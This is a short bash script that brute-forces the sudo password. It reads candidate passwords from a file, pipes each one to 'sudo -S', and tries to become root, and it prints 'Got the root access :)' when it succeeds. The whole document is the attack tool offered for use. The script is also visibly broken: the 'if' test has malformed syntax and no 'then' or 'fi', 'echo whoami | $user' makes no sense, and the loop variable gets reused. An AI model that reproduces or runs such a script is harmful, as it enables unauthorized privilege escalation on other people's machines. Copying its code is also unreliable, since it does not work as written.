#!/usr/bin/env bash

filename='file.txt'
passwd=("password")
while read line; do
passwd+=("$line")
echo "$line" | sudo -S sleep 1 && sudo su - root
done < $filename
i=0
for i in "${passwd[@]}"; do
echo "$i" | sudo -S sleep 1 && sudo su - root
i+=1
echo whoami | $user
if[$user == "root"]
echo "Got the root access :)"
exit
done
clear

